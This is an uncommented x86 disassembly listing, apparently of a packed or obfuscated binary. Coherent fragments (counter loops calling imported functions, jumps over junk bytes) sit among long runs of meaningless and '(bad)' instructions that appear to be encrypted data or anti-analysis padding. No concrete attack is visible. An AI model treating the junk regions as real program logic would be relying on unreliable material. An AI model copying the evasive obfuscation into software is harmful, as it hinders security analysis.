  406dab:	mov    esi,0xc3e5fe7b
  406db0:	mov    bl,0x13
  406db2:	es xor al,0xc2
  406db5:	add    al,0x64
  406db7:	lds    esi,FWORD PTR [edx-0x5e929a4]
  406dbd:	mov    ds:0x99495c9f,eax
  406dc2:	mov    cl,0x3
  406dc4:	push   cs
  406dc5:	bound  esp,QWORD PTR [edx+0x64]
  406dc8:	mov    ebp,DWORD PTR [edx]
  406dca:	or     ebp,DWORD PTR [eax]
  406dcc:	cmovle edi,DWORD PTR [ecx+esi*4-0x3f5e938c]
  406dd4:	pop    edi
  406dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd6:	ror    ah,1
  406dd8:	idiv   BYTE PTR [edi]
  406dda:	mov    bh,0x4b
  406ddc:	retf   
  406ddd:	dec    esi
  406dde:	mov    WORD PTR [ecx+0x74],gs
  406de1:	popf   
  406de2:	out    0x3b,eax
  406de4:	not    DWORD PTR [esi-0x3eb5af79]
  406dea:	mov    edi,0x20546413
  406def:	sub    eax,0xb617a45a
  406df4:	inc    edi
  406df5:	jge    0x406db2
  406df7:	arpl   WORD PTR [ecx],si
  406df9:	sbb    esp,DWORD PTR [edx-0x3d36209d]
  406dff:	rep outs dx,DWORD PTR ds:[esi]
  406e01:	ret    0x709e
  406e04:	xchg   ebx,eax
  406e05:	pop    esi
  406e06:	add    eax,DWORD PTR [edx+0x6142e9d8]
  406e0c:	add    DWORD PTR [ebx],0x48
  406e0f:	jnp    0x406de2
  406e11:	daa    
  406e12:	push   ebx
  406e13:	fldl2e 
  406e15:	vpermt2b zmm1{k7}{z},zmm2,zmm7
  406e1b:	xlat   BYTE PTR ds:[ebx]
  406e1c:	outs   dx,DWORD PTR ds:[esi]
  406e1d:	adc    al,0x5d
  406e1f:	in     al,0x23
  406e21:	jnp    0x406df8
  406e23:	scas   eax,DWORD PTR es:[edi]
  406e24:	push   ds
  406e25:	jecxz  0x406db0
  406e27:	adc    ebp,DWORD PTR [eax+0x4d]
  406e2a:	jge    0x406dcd
  406e2c:	push   ebp
  406e2d:	repnz cmp DWORD PTR [esi-0x4781c609],esp
  406e34:	and    esp,DWORD PTR [esi+0x1ae0cb84]
  406e3a:	xor    BYTE PTR [eax],ah
  406e3c:	xchg   esp,eax
  406e3d:	add    ebp,DWORD PTR [esi+ebp*8-0x34d85961]
  406e44:	fnstenv [edi-0x3a]
  406e47:	sti    
  406e48:	shr    edx,cl
  406e4a:	jmp    0x406e52
  406e4c:	fistp  QWORD PTR [edx-0x32]
  406e4f:	xchg   ecx,eax
  406e50:	xor    eax,0x2e100872
  406e55:	lods   eax,DWORD PTR ds:[esi]
  406e56:	mov    dh,0x99
  406e58:	and    al,0x4f
  406e5a:	mov    bl,0xd
  406e5c:	sbb    dl,BYTE PTR [ebp+0xa]
  406e5f:	inc    ebp
  406e60:	jecxz  0x406eb0
  406e62:	mov    ebp,0x5cd97f70
  406e67:	adc    dh,ch
  406e69:	jge    0x406e88
  406e6b:	pop    ebx
  406e6c:	test   DWORD PTR [edi-0x586787e8],0xd6bb256c
  406e76:	push   ecx
  406e77:	sbb    dh,ah
  406e79:	mov    ecx,0x5cc0f736
  406e7e:	cmc    
  406e7f:	pop    ss
  406e80:	cmp    eax,DWORD PTR [esi+0x30ff25bf]
  406e86:	lea    eax,ds:0x444024
  406e8c:	push   DWORD PTR [eax]
  406e8e:	lea    eax,ds:0x444258
  406e94:	push   DWORD PTR [eax]
  406e96:	lea    eax,ds:0x444348
  406e9c:	push   DWORD PTR [eax]
  406e9e:	xchg   ebx,edx
  406ea0:	inc    ebx
  406ea1:	inc    ebx
  406ea2:	jmp    0x406fce
  406ea7:	sbb    ebx,ecx
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0x3c7e7590
  406eb5:	xchg   edx,eax
  406eb6:	in     eax,0xc5
  406eb8:	cmp    al,0x7c
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406e71
  406ec0:	fild   WORD PTR [edi+0x3168e981]
  406ec6:	pop    edx
  406ec7:	jmp    0xa3ef9515
  406ecc:	xlat   BYTE PTR ds:[ebx]
  406ecd:	repz and ch,BYTE PTR [eax+0x25]
  406ed1:	fnsave [ebx+0xf]
  406ed4:	mov    ebx,0x6cf423ce
  406ed9:	cmp    ch,BYTE PTR [edi-0x45]
  406edc:	and    DWORD PTR [edi],edx
  406ede:	(bad)  
  406edf:	mov    esi,0x8fc23607
  406ee4:	aas    
  406ee5:	stos   DWORD PTR es:[edi],eax
  406ee6:	add    ch,BYTE PTR [eax]
  406ee8:	mov    ebx,0x2d103f14
  406eed:	shr    eax,cl
  406eef:	xor    eax,0x1a2453b2
  406ef4:	mov    ch,BYTE PTR [esi]
  406ef6:	out    0xf6,eax
  406ef8:	sti    
  406ef9:	cmp    eax,0xece84298
  406efe:	mov    ds:0xdb5c4a05,al
  406f03:	pop    ss
  406f04:	mov    eax,DWORD PTR [esi-0x326bafd4]
  406f0a:	pop    ebx
  406f0b:	xchg   BYTE PTR [ebx],ch
  406f0d:	test   al,0x40
  406f0f:	mov    ecx,?
  406f11:	sahf   
  406f12:	test   al,0x2d
  406f14:	dec    edx
  406f15:	out    dx,eax
  406f16:	in     eax,dx
  406f17:	mov    bl,0x39
  406f19:	scas   eax,DWORD PTR es:[edi]
  406f1a:	mov    dl,0x79
  406f1c:	mov    ds:0xbcf19ed2,al
  406f21:	outs   dx,BYTE PTR ds:[esi]
  406f22:	add    bl,al
  406f24:	call   0xedd52936
  406f29:	inc    ebx
  406f2a:	hlt    
  406f2b:	(bad)  
  406f2c:	lock loope 0x406f9a
  406f2f:	inc    esp
  406f30:	fwait
  406f31:	jno    0x406f15
  406f33:	sahf   
  406f34:	xor    cl,BYTE PTR [esi]
  406f36:	xchg   BYTE PTR [edi+0x35],al
  406f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f3a:	mov    gs,WORD PTR [esi+0x13edb1e4]
  406f40:	std    
  406f41:	ins    DWORD PTR es:[edi],dx
  406f42:	(bad)  ds:[edx+ebp*2]
  406f46:	push   ecx
  406f47:	xchg   esp,eax
  406f48:	xor    dh,cl
  406f4a:	and    BYTE PTR [edx],bh
  406f4c:	in     eax,dx
  406f4d:	mov    eax,ds:0xd30336f
  406f52:	rcr    DWORD PTR [esi+ecx*2+0x78],0x49
  406f57:	retf   0x95f
  406f5a:	jno    0x406f44
  406f5c:	xchg   ebx,eax
  406f5d:	mov    ecx,0x1249270c
  406f62:	fs ss jae 0x406f86
  406f66:	adc    DWORD PTR [edx-0x3a],edi
  406f69:	mov    ch,0x18
  406f6b:	fcmovb st,st(5)
  406f6d:	mul    DWORD PTR [ebp+0x45]
  406f70:	scas   eax,DWORD PTR es:[edi]
  406f71:	lahf   
  406f72:	fst    QWORD PTR [edx+0x20]
  406f75:	rcr    BYTE PTR [edx+eax*4+0x38],0x39
  406f7a:	ds daa 
  406f7c:	xor    al,0x22
  406f7e:	(bad)  
  406f7f:	cmp    al,dl
  406f81:	cld    
  406f82:	jle    0x406f46
  406f84:	or     bl,BYTE PTR [ebp+esi*2-0x3caedbbe]
  406f8b:	or     al,0x68
  406f8d:	cld    
  406f8e:	sar    bl,1
  406f90:	loope  0x406ff3
  406f92:	cmp    eax,0xcd05aaeb
  406f97:	mov    ebp,gs
  406f99:	mov    edx,0x8174b20
  406f9e:	mov    ebx,0x7370cbc
  406fa3:	mov    dl,0xc0
  406fa5:	call   0x5934:0x761e9992
  406fac:	cli    
  406fad:	xor    DWORD PTR [edi-0x57],0x60
  406fb1:	mov    esp,esp
  406fb3:	fistp  WORD PTR [edx+eax*1-0x38]
  406fb7:	stos   DWORD PTR es:[edi],eax
  406fb8:	stos   DWORD PTR es:[edi],eax
  406fb9:	jb     0x406f75
  406fbb:	pop    eax
  406fbc:	push   ds
  406fbd:	fdiv   QWORD PTR [ebp+0x63c60f23]
  406fc3:	lods   eax,DWORD PTR ds:[esi]
  406fc4:	dec    ebx
  406fc5:	mov    eax,0xfb92f536
  406fca:	sbb    esi,edi
  406fcc:	mov    ss,WORD PTR [ebx]
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x44421c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	loopne 0x40704e
  406ff2:	mul    DWORD PTR ds:0x7c7c3fd2
  406ff8:	or     eax,0xb7c7c7f
  406ffd:	or     al,0x60
  406fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407000:	test   BYTE PTR [esi-0x52],bl
  407003:	sbb    dl,ah
  407005:	dec    edi
  407006:	mov    bl,0x71
  407008:	inc    eax
  407009:	test   eax,0xce99f2c7
  40700e:	ror    DWORD PTR [ecx+edi*2-0x3afdce74],1
  407015:	(bad)  
  407016:	ror    esi,cl
  407018:	mov    ds:0xe0f59513,eax
  40701d:	or     DWORD PTR [edi],eax
  40701f:	pop    edi
  407020:	mov    edx,0xcf55bd7f
  407025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407026:	sti    
  407027:	jl     0x407056
  407029:	cld    
  40702a:	mov    eax,0xa3873427
  40702f:	adc    BYTE PTR [esp+eiz*8],cl
  407032:	fwait
  407033:	sbb    DWORD PTR [esi+edi*2-0x27d7d6e8],edi
  40703a:	push   esp
  40703b:	xor    DWORD PTR ds:0x4353a026,0xc70fb12d
  407045:	or     DWORD PTR [ebp-0x39d89ea2],eax
  40704b:	pop    eax
  40704c:	stc    
  40704d:	and    cl,BYTE PTR [edi+0x406f6688]
  407053:	xor    BYTE PTR [ebx+ebx*1+0x3a159265],bl
  40705a:	xchg   dh,cl
  40705c:	lock scas al,BYTE PTR es:[edi]
  40705e:	shl    DWORD PTR [ecx-0x3e0d9367],1
  407064:	dec    ecx
  407065:	sbb    al,0xfc
  407067:	xor    eax,0x38ee1399
  40706c:	(bad)  
  40706e:	jp     0x407075
  407070:	inc    ebp
  407071:	add    al,0x10
  407073:	or     al,0xc
  407075:	dec    DWORD PTR [edi-0x1747f3e0]
  40707b:	and    DWORD PTR [eax+eiz*4-0x6d69d0a1],esi
  407082:	jl     0x407084
  407084:	or     bl,BYTE PTR [ebx+0x5517b9c9]
  40708a:	push   edx
  40708b:	jle    0x407107
  40708d:	jb     0x407045
  40708f:	lds    esi,FWORD PTR [esi+0x44]
  407092:	push   cs
  407093:	cwde   
  407094:	out    dx,eax
  407095:	call   0x5ff7:0x9dcb2702
  40709c:	mov    ecx,0x6409b7f
  4070a1:	dec    ecx
  4070a2:	mov    bl,BYTE PTR ds:0x274efefa
  4070a8:	xchg   ecx,eax
  4070a9:	xchg   edx,eax
  4070ab:	inc    edx
  4070ac:	sbb    BYTE PTR [eax+0x756b3d44],0xe0
  4070b3:	push   eax
  4070b4:	pop    ds
  4070b5:	imul   BYTE PTR [edi+0x9dcc9db]
  4070bb:	popa   
  4070bc:	imul   ebx,esi,0x6a
  4070bf:	mov    dh,0x3e
  4070c1:	add    ebx,ecx
  4070c3:	dec    esi
  4070c4:	sub    ah,bh
  4070c6:	in     eax,dx
  4070c7:	jno    0x407132
  4070c9:	stc    
  4070ca:	data16 mul BYTE PTR [ebp+eax*2-0x58]
  4070cf:	int    0x76
  4070d1:	push   ebp
  4070d2:	add    al,0xcb
  4070d4:	leave  
  4070d5:	stos   DWORD PTR es:[edi],eax
  4070d6:	(bad)  
  4070d7:	push   ebp
  4070d8:	call   FWORD PTR [ecx-0x75db1028]
  4070de:	test   BYTE PTR [ebp+eiz*4-0x3873d43d],dl
  4070e5:	inc    eax
  4070e6:	or     DWORD PTR [esi],ebx
  4070e8:	fdivr  DWORD PTR [ebp-0x102dd888]
  4070ee:	scas   al,BYTE PTR es:[edi]
  4070ef:	rcl    DWORD PTR [esi],0xb0
  4070f2:	call   0x4820881c
  4070f7:	adc    bh,BYTE PTR [edi]
  4070f9:	xor    al,0xcf
  4070fb:	mov    dh,0x81
  4070fd:	inc    esi
  4070fe:	repnz nop
  407100:	xor    dl,BYTE PTR [ebx-0x70]
  407103:	sub    BYTE PTR [ebx+0x27],cl
  407106:	add    BYTE PTR [ecx+eiz*4],0x72
  40710a:	aas    
  40710b:	add    DWORD PTR [eax],ecx
  40710d:	pop    edi
  40710e:	pop    esi
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44d414,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	adc    al,bl
  407148:	scas   eax,DWORD PTR es:[edi]
  407149:	adc    bl,ah
  40714b:	ds jl  0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x40717c
  407153:	xchg   esp,eax
  407154:	jp     0x407187
  407156:	bound  ebx,QWORD PTR [ecx-0x359828b8]
  40715c:	je     0x407111
  40715e:	cdq    
  40715f:	mov    eax,ds:0xa406b8aa
  407164:	imul   DWORD PTR [eax]
  407166:	test   DWORD PTR [esi+0x9c389ab],eax
  40716c:	dec    eax
  40716d:	(bad)  
  40716e:	pop    bx
  407170:	push   cs
  407171:	enter  0xa5d1,0x7c
  407175:	mov    ss,WORD PTR [edi+edi*2]
  407178:	outs   dx,BYTE PTR ds:[esi]
  407179:	in     al,0xc
  40717b:	ja     0x4071b1
  40717d:	or     BYTE PTR [ebp-0x32],0xa0
  407181:	add    ecx,ecx
  407183:	(bad)  
  407184:	call   0x3b19f410
  407189:	test   DWORD PTR [esi+0x4c],ebx
  40718c:	jmp    0x407133
  40718e:	retf   0x7674
  407191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407192:	jbe    0x4071d2
  407194:	or     edi,esp
  407196:	and    DWORD PTR ds:0xad291ad9,ebx
  40719c:	jnp    0x407218
  40719e:	lods   eax,DWORD PTR ds:[esi]
  40719f:	repnz xchg edi,eax
  4071a1:	xor    DWORD PTR [edi-0x2c],esi
  4071a4:	mov    eax,fs
  4071a6:	xlat   BYTE PTR ds:[ebx]
  4071a7:	scas   eax,DWORD PTR es:[edi]
  4071a8:	hlt    
  4071a9:	push   ecx
  4071aa:	adc    dh,BYTE PTR [ecx+eax*2]
  4071ad:	mov    esi,0x2f190408
  4071b2:	add    DWORD PTR [ecx],esp
  4071b4:	push   edx
  4071b5:	sahf   
  4071b6:	pop    ecx
  4071b7:	lahf   
  4071b8:	cmp    ah,ch
  4071ba:	jbe    0x4071f9
  4071bc:	mov    dl,0x1a
  4071be:	add    al,0x66
  4071c0:	(bad)  [edx-0x12]
  4071c3:	ins    BYTE PTR es:[edi],dx
  4071c4:	adc    ecx,DWORD PTR [eax]
  4071c6:	je     0x4071b4
  4071c8:	cmp    al,0xfe
  4071ca:	xor    eax,0xac66fdc2
  4071cf:	adc    dh,BYTE PTR [ebx-0x4b]
  4071d2:	adc    DWORD PTR [eax-0x7bfdf481],0xffffff83
  4071d9:	pop    edx
  4071da:	iret   
  4071db:	mov    ds:0x88213654,eax
  4071e0:	sub    bl,BYTE PTR [ebp-0x1f6f7c9b]
  4071e6:	mov    ebp,0xbbcef239
  4071eb:	dec    eax
  4071ec:	and    eax,DWORD PTR [edi+0x4e8e42ea]
  4071f2:	dec    edi
  4071f3:	xchg   DWORD PTR [eax-0xb],ebx
  4071f6:	pop    ecx
  4071f7:	aam    0x35
  4071f9:	cli    
  4071fa:	ja     0x4071c6
  4071fc:	xchg   ecx,eax
  4071fd:	push   esp
  4071fe:	lods   al,BYTE PTR ds:[esi]
  4071ff:	sub    cl,BYTE PTR [ecx+0x4a9b12a1]
  407205:	test   dh,al
  407207:	push   esp
  407208:	and    al,BYTE PTR [ecx]
  40720a:	or     BYTE PTR [edi+0x66],bh
  40720d:	fisubr DWORD PTR [edx-0x58]
  407210:	(bad)  
  407211:	iret   
  407212:	xor    DWORD PTR [esi-0x2fc93a06],esp
  407218:	sub    dh,dh
  40721a:	inc    esp
  40721b:	and    ebp,ebx
  40721d:	cld    
  40721e:	sub    BYTE PTR [edx-0x79],dl
  407221:	jns    0x4071ce
  407223:	lock inc eax
  407225:	mov    edi,0x91cdaf80
  40722a:	test   al,0x77
  40722c:	inc    esi
  40722d:	xchg   ecx,eax
  40722e:	dec    esi
  40722f:	(bad)  
  407230:	fbld   TBYTE PTR [edi]
  407232:	(bad)  [esi+0x4919ed1c]
  407238:	into   
  407239:	inc    ebx
  40723a:	in     al,0x1d
  40723c:	xor    bh,BYTE PTR [edi+0x48b4bf1f]
  407242:	adc    eax,0x1bdeb55c
  407247:	repz or ecx,edx
  40724a:	push   cs
  40724b:	push   0x80f4f7b5
  407250:	adc    al,0xba
  407252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407253:	je     0x407289
  407255:	rcr    dh,cl
  407257:	int    0xaa
  407259:	xlat   BYTE PTR ds:[ebx]
  40725a:	inc    ecx
  40725b:	leave  
  40725c:	lahf   
  40725d:	jmp    0x61027799
  407262:	cmp    BYTE PTR [edx+0x19],bh
  407265:	mov    ch,BYTE PTR [esi+edi*4-0x494029c0]
  40726c:	mov    eax,0x9507
  407271:	and    DWORD PTR ds:0x41074f,0x0
  40727b:	mov    ecx,DWORD PTR ds:0x41074f
  407281:	inc    ecx
  407282:	mov    DWORD PTR ds:0x41074f,ecx
  407288:	cmp    DWORD PTR ds:0x41074f,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x424859
  40729a:	call   DWORD PTR ds:0x44236c
  4072a0:	cmp    DWORD PTR ds:0x41074f,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x44a6dc,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x44a6e0,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x44a6d8
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0xd90f98bb
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x40733d
  4072ec:	cmp    DWORD PTR [eax],0x348c1042
  4072f2:	fcomp  QWORD PTR [esi+0x72e59c3a]
  4072f8:	aaa    
  4072f9:	inc    edx
  4072fa:	jnp    0x407330
  4072fc:	sti    
  4072fd:	xlat   BYTE PTR ds:[ebx]
  4072fe:	test   DWORD PTR [edx+0x2],ebp
  407301:	pop    ds
  407302:	or     eax,0xe10ce2ae
  407307:	cmp    eax,0x2ab8b32d
  40730c:	xchg   ah,ah
  40730e:	nop
  40730f:	mov    ah,0xed
  407311:	dec    ebp
  407312:	inc    esp
  407313:	dec    esp
  407314:	das    
  407315:	push   0x4a
  407317:	pop    es
  407318:	pushf  
  407319:	xor    ebx,edx
  40731b:	or     bh,BYTE PTR [edx+0x558a991c]
  407321:	jne    0x407382
  407323:	adc    eax,edi
  407325:	or     edx,DWORD PTR [edx+0x49]
  407328:	je     0x4072e8
  40732a:	mov    BYTE PTR [edx-0x3],ch
  40732d:	xchg   DWORD PTR [esi+0x26],edx
  407330:	xchg   ebx,eax
  407331:	out    0x1d,eax
  407333:	mov    esi,0x44a529be
  407338:	push   0xffffffe0
  40733a:	pop    ecx
  40733b:	cdq    
  40733c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40733d:	fwait
  40733e:	sub    eax,0x782d0030
  407343:	ja     0x4072dc
  407345:	fwait
  407346:	mov    ecx,0x91208945
  40734b:	dec    ecx
  40734c:	add    ch,BYTE PTR [ebx]
  40734e:	repz xchg esp,eax
  407350:	push   esp
  407351:	mov    eax,0xff9efa63
  407357:	add    eax,0xe8fcd9d3
  40735c:	mov    ebx,0xbeae741d
  407361:	mov    al,ds:0xb1788ceb
  407366:	push   es
  407367:	xchg   ebx,eax
  407368:	bound  ecx,QWORD PTR [edi-0x77]
  40736b:	mov    al,ds:0x7ed3a6eb
  407370:	retf   
  407371:	gs inc esi
  407373:	(bad)  
  407374:	jmp    0xa312b250
  407379:	in     eax,dx
  40737a:	lea    ecx,[esi-0x76]
  40737d:	or     ecx,0xffffffe0
  407380:	mov    esp,0x91f00cc1
  407385:	sbb    eax,0x7644faa3
  40738a:	test   al,0xe8
  40738c:	packssdw mm1,QWORD PTR [ebx+edi*4]
  407390:	dec    ebx
  407391:	jne    0x4073cc
  407393:	mov    esp,ebp
  407395:	sbb    ecx,DWORD PTR [edi]
  407397:	dec    edi
  407398:	shl    DWORD PTR [edx+0x4e4c5a82],cl
  40739e:	cmp    eax,0x71e27b33
  4073a3:	add    eax,edi
  4073a5:	or     eax,0x14867d0
  4073aa:	int    0xe
  4073ac:	adc    ch,ch
  4073ae:	icebp  
  4073af:	out    dx,al
  4073b0:	mov    al,0xf0
  4073b2:	mov    ecx,0xe25bf0e5
  4073b7:	scas   al,BYTE PTR es:[edi]
  4073b8:	cmc    
  4073b9:	ins    BYTE PTR es:[edi],dx
  4073ba:	sub    bh,BYTE PTR [ebx]
  4073bc:	fld    TBYTE PTR [edi-0x5f]
  4073bf:	push   ebx
  4073c0:	fld    st(3)
  4073c2:	xor    esp,DWORD PTR [edi+0x639d90e6]
  4073c8:	or     bl,dh
  4073ca:	cmp    esp,DWORD PTR [edx+edi*1]
  4073cd:	fisub  WORD PTR [ecx+0x6b77789f]
  4073d3:	mov    ebp,0xd021c220
  4073d8:	int3   
  4073d9:	jb     0x4073f6
  4073db:	outs   dx,DWORD PTR ds:[esi]
  4073dc:	hlt    
  4073dd:	push   ss
  4073de:	std    
  4073df:	mov    eax,0x1fada4
  4073e4:	mov    bl,BYTE PTR [edi+ebx*4]
  4073e7:	inc    ebx
  4073e8:	mov    WORD PTR fs:[edx-0x58780a48],ss
  4073ef:	cwde   
  4073f0:	jle    0x40741e
  4073f2:	enter  0xe38d,0xc1
  4073f6:	cld    
  4073f7:	adc    ecx,DWORD PTR [eax-0x4c]
  4073fa:	mov    ah,0xcf
  4073fc:	mov    edx,0x2db41102
  407401:	push   ss
  407402:	loop   0x407425
  407404:	sbb    al,0x89
  407406:	inc    ebp
  407407:	fsubr  st,st(1)
  407409:	xor    al,BYTE PTR [ecx]
  40740b:	add    BYTE PTR [eax],al
  40740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740e:	(bad)  [ecx+0x67666966]
  407414:	fld    DWORD PTR [edx]
  407416:	xor    eax,0xd538cc56
  40741b:	ss cld 
  40741d:	xchg   edi,eax
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x407419
  407426:	enter  0xc56f,0x55
  40742a:	push   esi
  40742b:	in     al,dx
  40742c:	lea    ebx,[edx-0xba73f5f]
  407432:	sbb    DWORD PTR [edx+0x3de125da],esp
  407438:	pop    ds
  407439:	pop    ebx
  40743a:	mov    ebx,0x8140bf4f
  40743f:	dec    ebp
  407440:	pop    ss
  407441:	daa    
  407442:	xor    ebp,esp
  407444:	fs int 0x0
  407447:	mov    ch,0x1a
  407449:	or     ecx,DWORD PTR [esi]
  40744b:	cmp    BYTE PTR [ebp+0x6e],bl
  40744e:	test   al,0x2d
  407450:	pop    es
  407451:	sub    ecx,DWORD PTR [edi]
  407453:	or     DWORD PTR [ebx],ebx
  407455:	ins    BYTE PTR es:[edi],dx
  407456:	sub    al,0x76
  407458:	ficom  WORD PTR [ecx-0x34bbb71b]
  40745e:	or     DWORD PTR [edi+0x37847566],eax
  407464:	add    WORD PTR es:[ebx],di
  407468:	cmp    eax,0xed7e899c
  40746d:	xchg   ebx,esi
  40746f:	cmp    DWORD PTR [esi-0x38],0x70
  407473:	test   ah,0x28
  407476:	mov    al,0x18
  407478:	push   ecx
  407479:	inc    eax
  40747a:	push   ebp
  40747b:	jb     0x4074e8
  40747d:	pop    ebp
  40747e:	(bad)  
  407480:	mov    bl,0x31
  407482:	push   es
  407483:	rcl    DWORD PTR [eax-0x31b43e15],cl
  407489:	jno    0x4074ca
  40748b:	scas   al,BYTE PTR es:[edi]
  40748c:	fild   DWORD PTR [eax+0x76c67777]
  407492:	aam    0x5d
  407494:	push   ecx
  407496:	mov    edi,0xca60c8c9
  40749b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40749c:	ss out dx,eax
  40749e:	or     dl,BYTE PTR [esi+0x63fb2b6f]
  4074a4:	sub    edi,DWORD PTR [eax+0x5220e9c]
  4074aa:	nop
  4074ab:	sar    DWORD PTR [edi],cl
  4074ad:	out    dx,al
  4074ae:	mov    bh,0xed
  4074b0:	shl    al,cl
  4074b2:	fsubp  st(7),st
  4074b4:	jl     0x4074d8
  4074b6:	add    DWORD PTR [eax-0x2aa22267],esp
  4074bc:	rol    BYTE PTR ss:[edi+0x24893423],cl
  4074c3:	pop    ss
  4074c4:	dec    edi
  4074c5:	scas   al,BYTE PTR es:[edi]
  4074c6:	inc    edi
  4074c7:	hlt    
  4074c8:	jnp    0x4074d1
  4074ca:	sbb    DWORD PTR [esp+edi*4-0x6fedba9],eax
  4074d1:	jl     0x407461
  4074d3:	lea    esp,[esi]
  4074d5:	(bad)  
  4074d6:	out    0xb4,eax
  4074d8:	mov    al,ds:0x5311a89
  4074dd:	or     bl,BYTE PTR [edi]
  4074df:	add    edx,ebp
  4074e1:	jecxz  0x407515
  4074e3:	pusha  
  4074e4:	pop    edx
  4074e5:	sbb    ecx,ebx
  4074e7:	shr    BYTE PTR [edi],cl
  4074e9:	jo     0x4074c4
  4074eb:	mov    bl,BYTE PTR [edx-0x73]
  4074ee:	mov    ecx,0x51db8ffc
  4074f3:	lods   al,BYTE PTR ds:[esi]
  4074f4:	ret    0xd62a
  4074f7:	mov    esp,ecx
  4074f9:	xchg   BYTE PTR [ebx+0x18],dh
  4074fc:	jne    0x40754c
  4074fe:	enter  0x1841,0x2c
  407502:	jmp    edi
  407504:	pop    esp
  407505:	(bad)  
  407506:	and    dh,BYTE PTR [edi+0x1c004c3c]
  40750c:	(bad)  
  40750d:	sti    
  40750e:	jb     0x407514
  407510:	sbb    eax,0xccbffce8
  407515:	adc    bl,BYTE PTR [esi]
  407517:	push   0x4e
  407519:	xchg   edi,eax
  40751a:	jg     0x40750a
  40751c:	test   BYTE PTR ds:[edx+0x239ef096],ch
  407523:	in     al,0x4f
  407525:	push   cs
  407526:	lahf   
  407527:	dec    ebx
  407528:	mov    eax,ds:0x8ef19d57
  40752d:	imul   esp,DWORD PTR [edi+0x667da5ef],0x677ca7fc
  407537:	loopne 0x4075ab
  407539:	retf   
  40753a:	sbb    BYTE PTR [edx-0x741513fe],ah
  407540:	inc    ebp
  407541:	or     BYTE PTR [ebx],al
  407543:	or     eax,0x44a6e0
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x44d410,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x44a6d8,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x424865,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x424865
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x424865,esi
  4075a0:	cmp    DWORD PTR ds:0x424865,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41088a
  4075b2:	call   DWORD PTR ds:0x442374
  4075b8:	cmp    DWORD PTR ds:0x424865,0x18
  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x44d418,0x44d40c
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	add    eax,0xb1d97140
  4075ea:	xor    edi,DWORD PTR [esp+edi*2+0x6]
  4075ee:	jg     0x40766c
  4075f0:	jl     0x4075ed
  4075f2:	ins    BYTE PTR es:[edi],dx
  4075f3:	mov    esp,0xff192a88
  4075f8:	scas   al,BYTE PTR es:[edi]
  4075f9:	repz popf 
  4075fb:	jecxz  0x4075b8
  4075fd:	sub    DWORD PTR ds:0x9922662f,eax
  407603:	popa   
  407604:	or     edi,DWORD PTR [edx]
  407606:	loopne 0x407660
